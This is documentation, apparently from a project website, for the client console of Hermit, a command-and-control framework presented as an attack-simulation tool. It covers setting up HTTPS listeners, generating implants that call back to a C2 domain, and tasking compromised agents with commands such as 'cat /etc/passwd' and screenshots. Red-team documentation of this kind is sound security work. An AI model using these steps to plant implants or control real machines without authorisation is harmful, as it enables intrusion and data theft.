+++
title = "C2 Client"
date = 2024-01-02
[extra]
toc=true
+++

## Run (Connect to the C2 Server)

At first, make sure that [the C2 server](./c2-server) has already started. It's running on the port `9999` by default.  
Now run the `client` command to connect the C2 server.  

```sh
$ hermit client -H 0.0.0.0 -P 9999


        ┓┏┏┓┳┓┳┳┓┳┏┳┓
        ┣┫┣ ┣┫┃┃┃┃ ┃
        ┛┗┗┛┛┗┛ ┗┻ ┻
          C2 CLIENT
      +++++++++++++++++
      DEVELOPED BY HDKS

[+] Handshake has been completed.
[+] Connected to C2 server (ws://0.0.0.0:9999/hermit) successfully.

Hermit $
```

After connecting, the client console will start.

<br />

## Help

```sh
Hermit $ help
```

<br />

## Listener

### 1. Add New Listener

Hermit currently supports the `HTTPS` listener only.  
You need to specify the domains (`-d`) for HTTPS self-signed certificates.

```sh
Hermit $ listener add -d localhost,my-c2-server.com
```

Once the listener is added successfully, you can see it with the `listeners` (or `listener list`) command.

```sh
Hermit $ listeners
```

### 2. Start Listener

After adding a listener as the previous section, you can start it by the `listener start <ID or Name>` command.

```sh
Hermit $ listener start 1
```

### 3. Stop Listener

```sh
Hermit $ listener stop 1
```

### 4. Delete Listener

Listeners that you don't plan to use can be deleted using the `delete` command.

```sh
Hermit $ listener delete 1
```

If you want to delete all listeners, specify `all` to the second argument as below:

```sh
Hermit $ listener delete all
```

<br />

## Implant

### 1. Generate Implant

You can generate implants with `implant gen` command with specifying the listener URL (`-u`) that you've started the previous section. The agent will connect to this listener URL.

```sh
Hermit $ implant gen -u https://my-c2-server.com:4443/
```

After generating, you can see the information by `implants` (or `implant list`) command.

```sh
Hermit $ implants
```

Now you need to transfer this implant to the target computer and execute it.

### 2. Delete Implant

```sh
Hermit $ implant delete 1
```

If you want to delete all implants, specify `all` to the second argument as below:

```sh
Hermit $ implant delete all
```

<br />

## Agent

When the implant is executed, the agent will start and attempt to connect to your C2 server's listener.  
If it succeeds, the agent has been registered in the C2 server. You can check if the agent has been registered correctly with the `agents` (or `agent list`) command.

```sh
Hermit $ agents
```

### 1. Interact with Agent

To interact with the agent for the attack simulation, you can run the `agent use <ID or Name>` command.

```sh
Hermit $ agent use 1
```

This command switches to the agent mode.

### 2. Agent Mode: Send Tasks

After switching the agent mode, you can simulate various attacks e.g. enumeration, shell command, screenshot, etc.

```sh
Hermit [agent: agent_0123] $ whoami
Hermit [agent: agent_0123] $ cat /etc/passwd
Hermit [agetn: agent_0123] $ screenshot
```

### 3. Quit Agent Mode

To quit the agent mode and return the home console, run the `exit` command.

```sh
Hermit [agetn: agent_0123] $ exit
```

### 4. Delete Agent

```sh
Hermit $ agent delete 1
```

If you want to delete all agents, specify `all` to the second argument as below:

```sh
Hermit $ agent delete all
```

<br />

## Exit

To quit the client console, run the `exit` command.

```sh
Hermit $ exit
```